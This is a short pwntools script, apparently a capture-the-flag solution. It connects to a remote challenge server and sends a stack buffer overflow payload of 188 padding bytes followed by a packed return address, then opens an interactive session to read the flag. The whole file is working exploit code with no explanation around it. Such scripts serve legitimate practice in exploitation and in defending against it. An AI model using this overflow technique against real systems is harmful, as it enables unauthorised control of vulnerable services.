from pwn import *

context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
target = remote('hackme.inndy.tw', 7717)

payload = 'a' * 188 + p32(0x0804A060)

target.sendlineafter('Try to read the flag\n',payload)
target.interactive()


